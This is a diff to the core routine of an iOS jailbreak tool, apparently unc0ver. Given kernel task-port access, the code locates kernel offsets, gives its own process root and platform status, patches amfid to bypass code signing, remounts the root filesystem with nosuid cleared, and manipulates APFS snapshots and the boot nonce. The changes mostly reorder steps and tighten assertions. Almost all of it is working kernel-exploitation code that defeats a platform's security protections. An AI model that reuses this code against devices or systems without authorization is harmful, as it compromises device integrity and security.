@@ -61,7 +61,6 @@ extern int (*dsystem)(const char *);
             [[[[[UIApplication sharedApplication] delegate] window] rootViewController] presentViewController:alertController animated:YES completion:nil]; \
         }); \
         dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER); \
- \
         exit(1); \
     } \
 while (false)
@@ -173,13 +172,13 @@ char *copyBootHash(void)
 
 #define APPLESNAP "com.apple.os.update-"
 
-const char *systemSnapshot(char *bootHash)
+const char *systemSnapshot()
 {
-    if (!bootHash) {
-        return NULL;
-    }
-    
-    return [[NSString stringWithFormat:@APPLESNAP @"%s", bootHash] UTF8String];
+    char *BootHash = copyBootHash();
+    _assert(BootHash != NULL);
+    const char *SystemSnapshot = [[NSString stringWithFormat:@APPLESNAP @"%s", BootHash] UTF8String];
+    free(BootHash);
+    return SystemSnapshot;
 }
 
 uint64_t
@@ -930,6 +929,41 @@ mach_port_t try_restore_port() {
     return MACH_PORT_NULL;
 }
 
+// https://github.com/tihmstar/doubleH3lix/blob/4428c660832e98271f5d82f7a9c67e842b814621/doubleH3lix/jailbreak.mm#L645
+
+extern char* const* environ;
+int easyPosixSpawn(NSURL *launchPath,NSArray *arguments){
+    NSMutableArray *posixSpawnArguments=[arguments mutableCopy];
+    [posixSpawnArguments insertObject:[launchPath lastPathComponent] atIndex:0];
+    
+    int argc=(int)posixSpawnArguments.count+1;
+    printf("Number of posix_spawn arguments: %d\n",argc);
+    char **args=(char**)calloc(argc,sizeof(char *));
+    
+    for (int i=0; i<posixSpawnArguments.count; i++)
+        args[i]=(char *)[posixSpawnArguments[i]UTF8String];
+    
+    printf("File exists at launch path: %d\n",[[NSFileManager defaultManager]fileExistsAtPath:launchPath.path]);
+    printf("Executing %s: %s\n",launchPath.path.UTF8String,arguments.description.UTF8String);
+    
+    posix_spawn_file_actions_t action;
+    posix_spawn_file_actions_init(&action);
+    
+    pid_t pid;
+    int status;
+    status = posix_spawn(&pid, launchPath.path.UTF8String, &action, NULL, args, environ);
+    
+    if (status == 0) {
+        if (waitpid(pid, &status, 0) != -1) {
+            // wait
+        }
+    }
+    
+    posix_spawn_file_actions_destroy(&action);
+    
+    return status;
+}
+
 typedef struct {
     kptr_t trust_chain;
     kptr_t amficache;
@@ -950,9 +984,12 @@ typedef struct {
     kptr_t SHA1Update;
     kptr_t SHA1Final;
     kptr_t csblob_entitlements_dictionary_set;
+    kptr_t kernel_task;
+    kptr_t kernproc;
+    kptr_t cs_find_md;
 } offsets_t;
 
-void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, const char *boot_nonce, int disable_auto_updates, int disable_app_revokes)
+void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_daemons, int dump_apticket, int run_uicache, char *boot_nonce, int disable_auto_updates, int disable_app_revokes)
 {
     // Initialize variables.
     int rv = 0;
@@ -960,7 +997,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     NSMutableDictionary *md = nil;
     uint64_t vfs_context = 0;
     uint64_t devVnode = 0;
-    uint64_t _rootvnode = 0;
     uint64_t rootfs_vnode = 0;
     uint64_t v_mount = 0;
     uint32_t v_flag = 0;
@@ -968,16 +1004,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     int fd = 0;
     int i = 0;
     char *dev_path = NULL;
-    
-    {
-        // Initialize QiLin.
-        
-        LOG("Initializing QiLin...");
-        rv = initQiLin(tfp0, kernel_base);
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
-        LOG("Successfully initialized QiLin.");
-    }
     
     {
         // Initialize patchfinder64.
@@ -996,43 +1022,67 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         
         offsets.trust_chain = find_trustcache();
         LOG("trust_chain: " ADDR "\n", offsets.trust_chain);
+        _assert(offsets.trust_chain);
         offsets.amficache = find_amficache();
         LOG("amficache: " ADDR "\n", offsets.amficache);
+        _assert(offsets.amficache);
         offsets.OSBoolean_True = find_OSBoolean_True();
         LOG("OSBoolean_True: " ADDR "\n", offsets.OSBoolean_True);
+        _assert(offsets.OSBoolean_True);
         offsets.OSBoolean_False = find_OSBoolean_False();
         LOG("OSBoolean_False: " ADDR "\n", offsets.OSBoolean_False);
+        _assert(offsets.OSBoolean_False);
         offsets.osunserializexml = find_osunserializexml();
         LOG("osunserializexml: " ADDR "\n", offsets.osunserializexml);
+        _assert(offsets.osunserializexml);
         offsets.smalloc = find_smalloc();
         LOG("smalloc: " ADDR "\n", offsets.smalloc);
+        _assert(offsets.smalloc);
         offsets.allproc = find_allproc();
         LOG("allproc: " ADDR "\n", offsets.allproc);
+        _assert(offsets.allproc);
         offsets.add_x0_x0_0x40_ret = find_add_x0_x0_0x40_ret();
         LOG("add_x0_x0_0x40_ret: " ADDR "\n", offsets.add_x0_x0_0x40_ret);
+        _assert(offsets.add_x0_x0_0x40_ret);
         offsets.rootvnode = find_rootvnode();
         LOG("rootvnode: " ADDR "\n", offsets.rootvnode);
+        _assert(offsets.rootvnode);
         offsets.zone_map_ref = find_zone_map_ref();
         LOG("zone_map_ref: " ADDR "\n", offsets.zone_map_ref);
+        _assert(offsets.zone_map_ref);
         offsets.vfs_context_current = find_vfs_context_current();
         LOG("vfs_context_current: " ADDR "\n", offsets.vfs_context_current);
+        _assert(offsets.vfs_context_current);
         offsets.vnode_lookup = find_vnode_lookup();
         LOG("vnode_lookup: " ADDR "\n", offsets.vnode_lookup);
+        _assert(offsets.vnode_lookup);
         offsets.vnode_put = find_vnode_put();
         LOG("vnode_put: " ADDR "\n", offsets.vnode_put);
+        _assert(offsets.vnode_put);
         offsets.vnode_getfromfd = find_vnode_getfromfd();
         LOG("vnode_getfromfd: " ADDR "\n", offsets.vnode_getfromfd);
+        _assert(offsets.vnode_getfromfd);
         offsets.vnode_getattr = find_vnode_getattr();
         LOG("vnode_getattr: " ADDR "\n", offsets.vnode_getattr);
+        _assert(offsets.vnode_getattr);
         offsets.SHA1Init = find_SHA1Init();
         LOG("SHA1Init: " ADDR "\n", offsets.SHA1Init);
+        _assert(offsets.SHA1Init);
         offsets.SHA1Update = find_SHA1Update();
         LOG("SHA1Update: " ADDR "\n", offsets.SHA1Update);
+        _assert(offsets.SHA1Update);
         offsets.SHA1Final = find_SHA1Final();
         LOG("SHA1Final: " ADDR "\n", offsets.SHA1Final);
+        _assert(offsets.SHA1Final);
         offsets.csblob_entitlements_dictionary_set = find_csblob_entitlements_dictionary_set();
         LOG("csblob_entitlements_dictionary_set: " ADDR "\n", offsets.csblob_entitlements_dictionary_set);
-        _assert(offsets.trust_chain && offsets.amficache && offsets.OSBoolean_True && offsets.OSBoolean_False && offsets.osunserializexml && offsets.smalloc && offsets.allproc && offsets.add_x0_x0_0x40_ret && offsets.rootvnode && offsets.zone_map_ref && offsets.vfs_context_current && offsets.vnode_lookup && offsets.vnode_put && offsets.vnode_getfromfd && offsets.vnode_getattr && offsets.SHA1Init && offsets.SHA1Update && offsets.SHA1Final && offsets.csblob_entitlements_dictionary_set);
+        _assert(offsets.csblob_entitlements_dictionary_set);
+        offsets.kernel_task = find_kernel_task();
+        LOG("kernel_task: " ADDR "\n", offsets.kernel_task);
+        _assert(offsets.kernel_task);
+        offsets.kernproc = find_kernproc();
+        LOG("kernproc: " ADDR "\n", offsets.kernproc);
+        _assert(offsets.kernproc);
         
         LOG("Successfully found offsets.");
     }
@@ -1046,6 +1096,18 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     }
     
     {
+        // Initialize QiLin.
+        
+        LOG("Initializing QiLin...");
+        rv = initQiLin(tfp0, kernel_base);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        setKernelSymbol("_kernproc", offsets.kernproc);
+        setKernelSymbol("_rootvnode", offsets.rootvnode);
+        LOG("Successfully initialized QiLin.");
+    }
+    
+    {
         // Rootify myself.
         
         LOG("Rootifying myself...");
@@ -1053,6 +1115,16 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully rootified myself.");
+    }
+    
+    {
+        // Platformize myself.
+        
+        LOG("Platformizing myself...");
+        rv = platformizeMe();
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        LOG("Successfully platformized myself.");
     }
     
     {
@@ -1078,7 +1150,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
-        rv = chmod("/var/mobile/test.txt", 0755);
+        rv = chmod("/var/mobile/test.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chown("/var/mobile/test.txt", 0, 0);
@@ -1126,9 +1198,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         // Set boot-nonce.
         
         LOG("Setting boot-nonce...");
-        rv = execCommandAndWait("/usr/sbin/nvram", "IONVRAM-DELETE-PROPERTY=com.apple.System.boot-nonce", NULL, NULL, NULL, NULL);
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
         rv = execCommandAndWait("/usr/sbin/nvram", strdup([[NSString stringWithFormat:@"com.apple.System.boot-nonce=%s", boot_nonce] UTF8String]), NULL, NULL, NULL, NULL);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
@@ -1242,7 +1311,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             fd = open("/var/tmp/rootfsmnt", O_RDONLY, 0);
             LOG("fd: " "%d" "\n", fd);
             _assert(fd > 0);
-            rv = fs_snapshot_rename(fd, systemSnapshot(copyBootHash()), "orig-fs", 0);
+            rv = fs_snapshot_rename(fd, systemSnapshot(), "orig-fs", 0);
             _assert(errno == 2 || rv == 0);
             rv = fs_snapshot_create(fd, "orig-fs", 0);
             _assert(errno == 17 || rv == 0);
@@ -1259,8 +1328,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             _assert(rv == 0);
             LOG("Successfully rebooted.");
         }
-        _rootvnode = offsets.rootvnode;
-        rootfs_vnode = rk64(_rootvnode);
+        rootfs_vnode = rk64(offsets.rootvnode);
         v_mount = rk64(rootfs_vnode + 0xd8);
         v_flag = rk32(v_mount + 0x70);
         v_flag = v_flag & ~MNT_NOSUID;
@@ -1290,7 +1358,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         rv = fclose(a);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
-        rv = chmod("/test.txt", 0755);
+        rv = chmod("/test.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chown("/test.txt", 0, 0);
@@ -1318,9 +1386,26 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             fd = open("/", O_RDONLY, 0);
             LOG("fd: " "%d" "\n", fd);
             _assert(fd > 0);
-            rv = fs_snapshot_rename(fd, "orig-fs", systemSnapshot(copyBootHash()), 0);
-            LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
+            if (kCFCoreFoundationVersionNumber <= 1451.51) {
+                rv = fs_snapshot_rename(fd, "electra-prejailbreak", systemSnapshot(), 0);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                /*
+                rv = mkdir("/var/tmp/rootfsmnt", 0755);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                rv = spawnAndShaiHulud("/sbin/mount_apfs", "-s", "electra-prejailbreak", "/", "/var/tmp/rootfsmnt", NULL);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                rv = easyPosixSpawn([NSURL fileURLWithPath:@"/jb/rsync"], @[@"--verbose", @"--recursive", @"--checksum", @"--hard-links", @"--perms", @"--executability", @"--owner", @"--group", @"--devices", @"--specials", @"--times", @"--delete", @"--delete-after", @"--force", @"/var/tmp/rootfsmnt", @"/"]);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+                */
+            } else {
+                rv = fs_snapshot_rename(fd, "orig-fs", systemSnapshot(), 0);
+                LOG("rv: " "%d" "\n", rv);
+                _assert(rv == 0);
+            }
             rv = close(fd);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
@@ -1518,7 +1603,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         rv = copyfile([[[NSBundle mainBundle] pathForResource:@"strap" ofType:@"tgz"] UTF8String], "/var/tmp/strap.tgz", 0, COPYFILE_ALL);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
-        rv = chmod("/var/tmp/strap.tgz", 0755);
+        rv = chmod("/var/tmp/strap.tgz", 0644);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chown("/var/tmp/strap.tgz", 0, 0);
@@ -1555,22 +1640,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
     }
     
     {
-        // Platformize myself, amfid and launchd.
-        
-        LOG("Platformizing myself, amfid and launchd...");
-        rv = platformizeMe();
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
-        rv = platformizeProcAtAddr(getProcStructForPid(findPidOfProcess("amfid")));
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
-        rv = platformizeProcAtAddr(getProcStructForPid(1));
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
-        LOG("Successfully platformized myself, amfid and launchd.");
-    }
-    
-    {
         // Log slide.
         
         LOG("Logging slide...");
@@ -1578,7 +1647,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("a: " "%p" "\n", a);
         _assert(a != NULL);
         fprintf(a, ADDR "\n", kernel_base - KERNEL_SEARCH_ADDRESS);
-        rv = chmod("/tmp/slide.txt", 0755);
+        rv = chmod("/tmp/slide.txt", 0644);
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         rv = chown("/tmp/slide.txt", 0, 0);
@@ -1588,6 +1657,16 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully logged slide.");
+    }
+    
+    {
+        // Set HSP4.
+        
+        LOG("Setting HSP4...");
+        rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
+        LOG("rv: " "%d" "\n", rv);
+        _assert(rv == 0);
+        LOG("Successfully set HSP4.");
     }
     
     {
@@ -1602,16 +1681,6 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         LOG("Successfully patched amfid.");
-    }
-    
-    {
-        // Set HSP4.
-        
-        LOG("Setting HSP4...");
-        rv = remap_tfp0_set_hsp4(&tfp0, offsets.zone_map_ref);
-        LOG("rv: " "%d" "\n", rv);
-        _assert(rv == 0);
-        LOG("Successfully set HSP4.");
     }
     
     {
@@ -1635,7 +1704,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/jb/jailbreakd.plist"];
-        _assert(md);
+        _assert(md != NULL);
         md[@"EnvironmentVariables"][@"KernelBase"] = [NSString stringWithFormat:@ADDR, kernel_base];
         md[@"EnvironmentVariables"][@"KernProcAddr"] = [NSString stringWithFormat:@ADDR, rk64(findKernelSymbol("_kernproc"))];
         md[@"EnvironmentVariables"][@"ZoneMapOffset"] = [NSString stringWithFormat:@ADDR, offsets.zone_map_ref - (kernel_base - KERNEL_SEARCH_ADDRESS)];
@@ -1741,7 +1810,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
-            rv = chmod("/var/lib/dpkg/available", 0755);
+            rv = chmod("/var/lib/dpkg/available", 0644);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             rv = chown("/var/lib/dpkg/available", 0, 0);
@@ -1753,10 +1822,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
-            rv = fclose(fopen("/.installed_unc0ver", "w"));
-            LOG("rv: " "%d" "\n", rv);
-            _assert(rv == 0);
-            rv = chmod("/.installed_unc0ver", 0755);
+            rv = chmod("/.installed_unc0ver", 0644);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             rv = chown("/.installed_unc0ver", 0, 0);
@@ -1784,7 +1850,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
             rv = fclose(a);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
-            rv = chmod("/.cydia_no_stash", 0755);
+            rv = chmod("/.cydia_no_stash", 0644);
             LOG("rv: " "%d" "\n", rv);
             _assert(rv == 0);
             rv = chown("/.cydia_no_stash", 0, 0);
@@ -1811,7 +1877,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("rv: " "%d" "\n", rv);
         _assert(rv == 0);
         md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
-        _assert(md);
+        _assert(md != NULL);
         md[@"SBShowNonDefaultSystemApps"] = @(YES);
         rv = [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];
         LOG("rv: " "%d" "\n", rv);
@@ -1941,7 +2007,7 @@ void exploit(mach_port_t tfp0, uint64_t kernel_base, int load_tweaks, int load_d
         LOG("Validating TFP0...");
         _assert(MACH_PORT_VALID(tfp0));
         LOG("Successfully validated TFP0.");
-        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], [[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_AUTO_UPDATES], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_APP_REVOKES]);
+        exploit(tfp0, (uint64_t)get_kernel_base(tfp0), [[NSUserDefaults standardUserDefaults] boolForKey:@K_TWEAK_INJECTION], [[NSUserDefaults standardUserDefaults] boolForKey:@K_LOAD_DAEMONS], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DUMP_APTICKET], [[NSUserDefaults standardUserDefaults] boolForKey:@K_REFRESH_ICON_CACHE], strdup([[[NSUserDefaults standardUserDefaults] objectForKey:@K_BOOT_NONCE] UTF8String]), [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_AUTO_UPDATES], [[NSUserDefaults standardUserDefaults] boolForKey:@K_DISABLE_APP_REVOKES]);
         dispatch_async(dispatch_get_main_queue(), ^{
             [self.goButton setTitle:@"Done, exit." forState:UIControlStateDisabled];
         });
